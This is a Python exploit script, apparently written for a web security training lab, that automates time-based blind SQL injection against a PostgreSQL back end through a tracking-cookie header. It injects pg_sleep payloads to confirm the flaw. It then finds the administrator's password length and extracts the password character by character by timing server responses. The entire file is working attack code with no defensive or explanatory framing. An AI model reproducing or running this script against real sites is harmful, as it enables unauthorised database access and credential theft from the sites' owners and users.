import requests
import optparse
import math

password = ""
password_length = 0

def get_args():
    parser = optparse.OptionParser()
    parser.add_option("-u", "--url", dest="url", help="URL in format http(s)://<url>")
    parser.add_option("-s", "--session", dest="session", help="Session cookie in format: cookie_name=cookie_value")
    parser.add_option("-t", "--token", dest="cookie", help="Token cookie in format: token_name=token_value")
    (options, arguments) = parser.parse_args()
    if not options.url:
        parser.error("[-] Please specify url, use --help for more info.")
    elif not options.session:
        parser.error("[-] Please specify session cookie, use --help for more info.")
    elif not options.cookie:
        parser.error("[-] Please specify token cookie, use --help for more info.")
    return options

options = get_args()
url = options.url
session = options.session
cookie = options.cookie

def check_if_vulnerable(url,session,cookie):
    response = requests.get(url,
            headers={'Cookie':cookie+'\'||pg_sleep(10)--; '+session})
    if response.elapsed.total_seconds() >= math.floor(10):
        print("[+] Target probably vulnerable")
    else:
        print("[-] Target might not be vulnerable")

def check_password_length(url,session,cookie):
    for i in range(1,30,1):
        response = requests.get(url,
                headers={'Cookie':cookie+'\'||(SELECT CASE WHEN (username=\'administrator\' AND LENGTH(password) = '+str(i)+') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)||\'; '+session})
        if response.elapsed.total_seconds() >= math.floor(10):
            password_length = i
            print("[+] Password length is " + str(password_length))
            return password_length
    if password_length == 0:
        print("[-] Could not find password length") 


def make_req(url,session,cookie):
    password_length = check_password_length(url,session,cookie)
    password = ""
    charString = "0123456789abcdefghijklmnopqrstuvwxyz"
    for i in range(1,password_length+1,1):
        for j in charString:
            response = requests.get(url,
                headers={'Cookie':cookie+'\'||(SELECT CASE WHEN (username=\'administrator\' AND SUBSTRING(password,'+str(i)+',1) = \''+str(j)+'\') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)||\'; '+session})
            if response.elapsed.total_seconds() >= math.floor(4.5):
                password += j
                print("[*] Discovering password: " + password)
            else:
                continue
    # if password not empty
    if password:
        print("[+] The password is " + password)
        return password
    else:
        print("[-] Could not find password. Exiting...")
        exit(1)

check_if_vulnerable(url, session, cookie)
make_req(url, session, cookie)
